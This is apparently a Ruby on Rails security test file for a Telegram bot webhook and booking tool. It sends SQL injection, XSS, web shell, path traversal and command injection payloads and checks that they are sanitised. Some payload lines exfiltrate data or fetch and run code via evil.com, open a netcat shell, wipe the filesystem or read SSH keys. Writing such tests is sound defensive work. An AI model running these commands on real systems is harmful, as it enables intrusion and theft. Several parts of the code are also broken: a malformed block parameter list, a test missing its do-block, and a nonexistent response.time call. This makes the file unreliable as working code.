# frozen_string_literal: true

require 'test_helper'

class InputValidationTest < ActiveSupport::TestCase
  include TelegramSupport

  setup do
    @chat_id = 123456789
    @webhook_url = '/telegram/webhook'
  end

  def create_webhook_payload(text = 'test message', chat_id: @chat_id)
    from = { id: chat_id, is_bot: false, first_name: 'Test', last_name: 'User', username: 'testuser' }
    chat = { id: chat_id, first_name: 'Test', last_name: 'User', username: 'testuser', type: 'private' }
    {
      update_id: 123456789,
      message: { message_id: 1, from: from, chat: chat, date: Time.current.to_i, text: text }
    }
  end

  test 'rejects SQL injection attempts in message content' do
    sql_injection_payloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; SELECT * FROM users; --",
      "'; UPDATE users SET password='hacked'; --",
      "'; INSERT INTO users VALUES('hacker','password'); --",
      "1' UNION SELECT username, password FROM users --",
      "'; DELETE FROM messages; --",
      "'; ALTER TABLE users ADD COLUMN hacked TEXT; --",
      "'; CREATE TABLE hacked_table (id INT); --",
      "'; EXEC xp_cmdshell('dir'); --"
    ]

    sql_injection_payloads.each_with_index do |payload, index|
      puts "Testing SQL injection payload #{index + 1}: #{payload[0..50]}..."

      post @webhook_url,
           headers: { 'Content-Type' => 'application/json' },
           params: create_webhook_payload(payload)

      # Should handle gracefully without executing SQL
      assert_response :success, "Should handle SQL injection attempt gracefully"

      # Verify no tables were dropped or modified
      assert_nothing_raised do
        User.count
        Message.count
        TelegramUser.count
        AnalyticsEvent.count
      end
    end

    puts "✓ All SQL injection attempts handled safely"
  end

  test 'rejects XSS attempts in message content' do
    xss_payloads = [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<input onfocus="alert(\'XSS\')" autofocus>',
      '<select onfocus="alert(\'XSS\')" autofocus>',
      '<textarea onfocus="alert(\'XSS\')" autofocus>',
      '<keygen onfocus="alert(\'XSS\')" autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src="x" onerror="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      '\"><script>alert(\"XSS\")</script>',
      '<script>document.location="http://evil.com"</script>',
      '<meta http-equiv="refresh" content="0;url=http://evil.com">'
    ]

    xss_payloads.each_with_index do |payload, index|
      puts "Testing XSS payload #{index + 1}: #{payload[0..50]}..."

      post @webhook_url,
           headers: { 'Content-Type' => 'application/json' },
           params: create_webhook_payload(payload)

      assert_response :success, "Should handle XSS attempt gracefully"

      # Check that no JavaScript was executed (this would be visible in browser testing)
      # For API testing, we ensure the payload is stored safely
      if Message.last&.content&.include?(payload)
        stored_content = Message.last.content
        # Content should be sanitized or escaped
        refute_includes stored_content, '<script>', "Script tags should be removed or escaped"
        refute_includes stored_content, 'javascript:', "JavaScript URLs should be removed or escaped"
        refute_includes stored_content, 'onerror=', "Event handlers should be removed or escaped"
        refute_includes stored_content, 'onload=', "Event handlers should be removed or escaped"
      end
    end

    puts "✓ All XSS attempts handled safely"
  end

  test 'validates and sanitizes extremely long messages' do
    puts "Testing extremely long message handling..."

    # Test various message lengths
    length_tests = [
      { length: 1000, description: "1KB" },
      { length: 10000, description: "10KB" },
      { length: 100000, description: "100KB" },
      { length: 1000000, description: "1MB" }
    ]

    length_tests.each do |test|
      puts "  Testing #{test[:description]} message (#{test[:length]} characters)..."

      long_message = 'a' * test[:length]

      post @webhook_url,
           headers: { 'Content-Type' => 'application/json' },
           params: create_webhook_payload(long_message)

      # Should handle gracefully
      assert_response :success, "Should handle #{test[:description]} messages"

      # Check memory usage is reasonable
      if Message.last
        stored_length = Message.last.content.length
        assert stored_length <= 50000, "Stored message should be truncated to reasonable size: #{stored_length} chars"
      end
    end

    puts "✓ Long messages handled appropriately"
  end

  test 'validates special character encoding' do
    puts "Testing special character encoding..."

    special_char_payloads = [
      "Null byte: \x00",
      "Control chars: \x01\x02\x03",
      "High Unicode: \u{1F600} \u{1F4A9}",
      "Zero-width characters: \u200B\u200C\u200D",
      "BIDI override: \u202E\u202D",
      "Form feed: \f",
      "Vertical tab: \v",
      "Backspace: \b",
      "Bell: \a",
      "Escape: \e",
      "Mixed specials: \x00\u200B\u202E\u{1F4A9}"
    ]

    special_char_payloads.each_with_index do |payload, index|
      puts "  Testing special character payload #{index + 1}..."

      post @webhook_url,
           headers: { 'Content-Type' => 'application/json' },
           params: create_webhook_payload(payload)

      assert_response :success, "Should handle special characters gracefully"

      # Check stored content doesn't contain dangerous characters
      if Message.last
        stored_content = Message.last.content
        refute_includes stored_content, "\x00", "Null bytes should be removed"
        refute_includes stored_content, "\x01", "Control characters should be removed"
        refute_includes stored_content, "\x02", "Control characters should be removed"
        refute_includes stored_content, "\x03", "Control characters should be removed"
      end
    end

    puts "✓ Special characters handled safely"
  end

  test 'validates malformed JSON and data structures' do
    puts "Testing malformed JSON and data structures..."

    malformed_payloads = [
      # Invalid JSON
      '{ invalid json }',
      '{"update_id": 123, "message": }',  # Incomplete JSON
      '{"update_id": "not_a_number", "message": {"text": "test"}}',  # Wrong data type
      '{"message": {"text": null}}',  # Missing required fields
      '{"update_id": 123, "message": {"from": {"id": "not_a_number"}}}',  # Invalid user ID
      '{"update_id": 123, "message": {"chat": {"type": "invalid_type"}}}',  # Invalid chat type
      # Deeply nested structures
      '{"nested": ' + ('{"level": ' * 100) + '"deep"' + ('}' * 100) + '}',
      # Circular references (can't be represented in JSON, but test deep nesting)
      '{"update_id": 123, "message": {"text": "' + 'test' * 10000 + '"}}',
      # Array instead of object
      '["not", "an", "object"]',
      # Numbers that are too large
      '{"update_id": 999999999999999999999999999999}',
      # Boolean strings
      '{"update_id": "true", "message": {"text": "test"}}'
    ]

    malformed_payloads.each_with_index do |payload, index|
      puts "  Testing malformed payload #{index + 1}..."

      begin
        post @webhook_url,
             headers: { 'Content-Type' => 'application/json' },
             params: payload

        # Should return appropriate error or handle gracefully
        assert [200, 400, 422].include?(response.status),
               "Should handle malformed JSON gracefully: #{response.status}"
      rescue JSON::ParserError => e
        # Expected for truly malformed JSON
        puts "    JSON parsing error (expected): #{e.message}"
      rescue => e
        flunk "Unexpected error handling malformed payload: #{e.class}: #{e.message}"
      end
    end

    puts "✓ Malformed data structures handled safely"
  end

  test 'validates input against buffer overflow attempts' do
    puts "Testing buffer overflow protection..."

    # Test with extremely large nested structures
    overflow_attempts = [
      # Very deep object nesting
      { nested: ('{"level": ' * 1000) + '"deep"' + ('}' * 1000) },
      # Very long array
      { array: ('"item",' * 10000) + '"last_item"' },
      # Very long string
      { string: 'x' * 1000000 },
      # Very long key names
      { ('k' * 10000) => 'value' },
      # Mixed large structure
      {
        users: Array.new(1000) { |i| { id: i, name: 'x' * 1000 } },
        messages: Array.new(1000) { |i| { text: 'y' * 1000, user_id: i } }
      }
    ]

    overflow_attempts.each_with_index do (attempt, index)
      puts "  Testing overflow attempt #{index + 1}..."

      # Create webhook payload with overflow attempt
      payload = create_webhook_payload("Overflow test #{index}")
      payload[:test_data] = attempt

      begin
        post @webhook_url,
             headers: { 'Content-Type' => 'application/json' },
             params: payload.to_json

        # Should handle gracefully without crashing
        assert_response :success, "Should handle buffer overflow attempt gracefully"

        # Check response time is reasonable (not hanging)
        assert response.time < 5.seconds, "Request took too long (possible DoS): #{response.time}s"
      rescue => e
        flunk "Buffer overflow attempt caused crash: #{e.class}: #{e.message}"
      end
    end

    puts "✓ Buffer overflow attempts handled safely"
  end

  test 'validates phone number input formats' do
    puts "Testing phone number validation..."

    # Test various phone number formats that might be used in booking
    phone_formats = [
      # Valid formats
      '+7(999)123-45-67',
      '+1-555-123-4567',
      '+44 20 7123 4567',
      '+86 138 0013 8000',
      # Invalid formats with special characters
      '+7(999)123-45-67; DROP TABLE users; --',
      '+1-555-<script>alert("xss")</script>-4567',
      '+44 20 7123\04567',
      '+86 138 0013 8000' + '\x00' * 100,
      # Extremely long phone numbers
      '+7' + '9' * 100,
      'phone: ' + 'x' * 1000,
      # Phone numbers with URLs
      '+7(999)123-45-67 http://evil.com/steal?phone=',
      'tel:+1-555-123-4567?redirect=http://evil.com'
    ]

    phone_formats.each_with_index do |phone, index|
      puts "  Testing phone format #{index + 1}: #{phone[0..30]}..."

      # Test through booking tool
      booking_data = {
        customer_name: 'Test Customer',
        customer_phone: phone,
        car_brand: 'Test',
        car_model: 'Test',
        required_services: 'Test',
        cost_calculation: 'Test',
        dialog_context: 'Test',
        details: 'Test'
      }

      begin
        user = TelegramUser.create!(
          id: @chat_id + index,
          first_name: 'PhoneTest',
          username: "phonetest#{index}"
        )
        chat = Chat.create!(telegram_user: user)

        tool = BookingTool.new(telegram_user: user, chat: chat)
        result = tool.execute(**booking_data)

        if result[:success]
          booking = Booking.last
          # Check that phone number is sanitized
          stored_phone = booking.customer_phone
          refute_includes stored_phone, '<script>', "Phone should not contain script tags"
          refute_includes stored_phone, 'DROP TABLE', "Phone should not contain SQL injection"
          refute_includes stored_phone, 'http://', "Phone should not contain URLs (or they should be sanitized)"
          assert stored_phone.length <= 50, "Phone number should be reasonably truncated: #{stored_phone.length}"
        end
      rescue => e
        # Validation errors are acceptable
        puts "    Validation error (acceptable): #{e.message}"
      end
    end

    puts "✓ Phone number formats validated and sanitized"
  end

  test 'validates file upload and attachment security' do
    puts "Testing file upload security..."

    # Test various potentially dangerous file types and names
    dangerous_files = [
      { name: '../../../etc/passwd', content: 'fake content', type: 'text/plain' },
      { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
      { name: 'exploit.js', content: 'document.location="http://evil.com"', type: 'application/javascript' },
      { name: 'malware.exe', content: 'MZ\x90\x00', type: 'application/octet-stream' },
      { name: '../../../config/database.yml', content: 'fake config', type: 'application/yaml' },
      { name: '.htaccess', content: 'Options +ExecCGI', type: 'text/plain' },
      { name: 'shell.jsp', content: '<% Runtime.getRuntime().exec("whoami"); %>', type: 'application/x-jsp' },
      { name: 'web.config', content: '<configuration><system.webServer>', type: 'application/xml' },
      { name: 'very_long_filename_' + 'x' * 200 + '.txt', content: 'test', type: 'text/plain' },
      { name: 'file with spaces.txt', content: 'test', type: 'text/plain' },
      { name: 'file\nwith\nnewlines.txt', content: 'test', type: 'text/plain' },
      { name: 'null\x00byte.txt', content: 'test', type: 'text/plain' }
    ]

    dangerous_files.each_with_index do |file, index|
      puts "  Testing dangerous file #{index + 1}: #{file[:name][0..30]}..."

      # Create a message with attachment simulation
      # Note: This would need to be adapted based on actual attachment handling
      message_data = {
        text: "File upload test: #{file[:name]}",
        # Simulate attachment data structure
        attachment: {
          filename: file[:name],
          content_type: file[:type],
          size: file[:content].length
        }
      }

      begin
        post @webhook_url,
             headers: { 'Content-Type' => 'application/json' },
             params: create_webhook_payload(message_data[:text])

        assert_response :success, "Should handle file upload attempts gracefully"

        # Verify dangerous files weren't processed
        if Message.last&.content&.include?(file[:name])
          stored_content = Message.last.content
          # Check filename sanitization
          refute_includes stored_content, '../', "Path traversal should be prevented"
          refute_includes stored_content, '.php', "Dangerous file extensions should be handled"
          refute_includes stored_content, '.exe', "Dangerous file extensions should be handled"
          refute_includes stored_content, "\x00", "Null bytes in filenames should be removed"
        end
      rescue => e
        puts "    File upload rejected (acceptable): #{e.message}"
      end
    end

    puts "✓ File upload security validated"
  end

  test 'validates command injection attempts' do
    puts "Testing command injection protection..."

    command_injection_payloads = [
      '; ls -la',
      '| whoami',
      '& cat /etc/passwd',
      '`id`',
      '$(echo "hack")',
      '; rm -rf /',
      '| curl http://evil.com/steal?data=',
      '& ping -c 10 127.0.0.1',
      '`nc -e /bin/sh 127.0.0.1 4444`',
      '; wget http://evil.com/malware.sh -O- | sh',
      '| python -c "import os; os.system(\'whoami\')"',
      '& ruby -e "system(\'whoami\')"',
      '; echo $HOME',
      '`env`',
      '$(env)',
      '; printenv',
      '| cat ~/.ssh/id_rsa'
    ]

    command_injection_payloads.each_with_index do |payload, index|
      puts "  Testing command injection #{index + 1}: #{payload}..."

      post @webhook_url,
           headers: { 'Content-Type' => 'application/json' },
           params: create_webhook_payload("Test message with #{payload}")

      assert_response :success, "Should handle command injection gracefully"

      # Verify commands weren't executed (difficult to prove in unit tests,
      # but we can check the content is stored safely)
      if Message.last&.content&.include?(payload)
        stored_content = Message.last.content
        # Content should be sanitized or special characters escaped
        refute stored_content.include?('; ls'), "Command separators should be handled"
        refute stored_content.include?('| whoami'), "Command pipes should be handled"
        refute stored_content.include?('`id`'), "Command substitution should be handled"
      end
    end

    puts "✓ Command injection attempts handled safely"
  end

  test 'validates NoSQL injection attempts' if defined?(Mongo)
    puts "Testing NoSQL injection protection..."

    nosql_injection_payloads = [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$regex": ".*"}',
      '{"$where": "this.name == \'admin\'"}',
      '{"$or": [{"user": "admin"}, {"password": {"$ne": ""}}]}',
      '{"$in": ["admin", "root"]}',
      '{"$exists": true}',
      '{"$all": ["admin"]}',
      '{"$elemMatch": {"role": "admin"}}',
      '{"$size": 0}'
    ]

    nosql_injection_payloads.each_with_index do |payload, index|
      puts "  Testing NoSQL injection #{index + 1}: #{payload}..."

      post @webhook_url,
           headers: { 'Content-Type' => 'application/json' },
           params: create_webhook_payload("NoSQL test: #{payload}")

      assert_response :success, "Should handle NoSQL injection gracefully"

      # Verify NoSQL operators weren't processed as queries
      if Message.last&.content&.include?(payload)
        stored_content = Message.last.content
        # NoSQL operators should be treated as literal strings
        assert stored_content.include?('$gt'), "NoSQL operators should be stored as literal text"
        assert stored_content.include?('$ne'), "NoSQL operators should be stored as literal text"
      end
    end

    puts "✓ NoSQL injection attempts handled safely"
  end

  test 'validates input encoding and charset issues' do
    puts "Testing input encoding and charset handling..."

    encoding_payloads = [
      # Invalid UTF-8 sequences
      "\xFF\xFE",  # Invalid BOM
      "\xC0\x80",  # Overlong encoding
      "\xE0\x80\x80",  # Overlong 3-byte sequence
      "\xF0\x80\x80\x80",  # Overlong 4-byte sequence
      # Mixed encoding attempts
      "Hello\xFFWorld",
      "Test\xFE\xFFMessage",
      # High Unicode that might cause issues
      "\u{D800}",  # High surrogate without low surrogate
      "\u{DC00}",  # Low surrogate without high surrogate
      "\u{FFFF}",  # Non-character
      # BOM in the middle of text
      "Prefix\xEF\xBB\xBFSuffix",
      # Control characters that shouldn't be in text
      "Text\x01\x02\x03with\x04\x05control chars",
      # Bidirectional override characters
      "Start\u202EMIDDLE\u202DEND",
      # Zero-width characters that could be used for spoofing
      "a\u200Bb\u200Cc\u200Dd"
    ]

    encoding_payloads.each_with_index do |payload, index|
      puts "  Testing encoding payload #{index + 1}..."

      begin
        post @webhook_url,
             headers: { 'Content-Type' => 'application/json; charset=utf-8' },
             params: create_webhook_payload(payload)

        assert_response :success, "Should handle encoding issues gracefully"

        # Check stored content is properly sanitized
        if Message.last&.content&.include?(payload)
          stored_content = Message.last.content
          # Should not contain problematic sequences
          refute stored_content.include?("\xFF"), "Invalid byte sequences should be removed"
          refute stored_content.include?("\xFE"), "Invalid byte sequences should be removed"
          refute stored_content.include?("\x01"), "Control characters should be removed"
        end
      rescue => e
        puts "    Encoding error handled gracefully: #{e.message}"
      end
    end

    puts "✓ Encoding and charset issues handled safely"
  end
end